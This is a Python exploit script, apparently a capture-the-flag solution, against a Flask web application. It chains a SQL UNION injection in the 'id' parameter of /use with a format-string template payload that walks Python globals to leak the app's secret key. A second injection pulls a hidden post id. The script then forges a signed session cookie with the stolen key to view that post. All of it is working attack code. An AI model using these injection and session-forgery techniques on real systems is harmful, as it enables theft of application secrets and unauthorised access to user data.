import requests
import sys
import urllib.parse
import hashlib
from bs4 import BeautifulSoup
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import *

session = requests.session()

sqli = " union SELECT 0 as id, 'ans' as title, '{field.__init__.__globals__[http]._dt_as_utc.__globals__[sys].modules[flask].current_app.secret_key}' as template"

session.get(f'{sys.argv[1]}')
data = session.post(f'{sys.argv[1]}/use?id=0{urllib.parse.quote(sqli, safe="")}', params={'a': 'a'}).text

secret_key = BeautifulSoup(data, "html.parser").article.get_text()
print(f'secret_key: {secret_key}')

sqli = " union SELECT id, id as title, id as template from copypasta where orig_id=3"
data = session.get(f'{sys.argv[1]}/use?id=0{urllib.parse.quote(sqli, safe="")}').text

flagid = BeautifulSoup(data, "html.parser").pre.get_text()
print(f'flagid: {flagid}')

for a in session.cookies:
    if a.name == 'session':
        nowsession = a
        break

serializer = URLSafeTimedSerializer(secret_key=secret_key,
                  salt='cookie-session',
                  serializer=TaggedJSONSerializer(),
                  signer_kwargs={
                      'key_derivation': 'hmac',
                      'digest_method': hashlib.sha1,
                  })

sessiondata = serializer.loads(nowsession.value)
sessiondata['posts'].append(flagid)
session.cookies.set(nowsession.name, serializer.dumps(sessiondata), domain=nowsession.domain, path=nowsession.path)

print(session.get(f'{sys.argv[1]}/view/{flagid}').text)



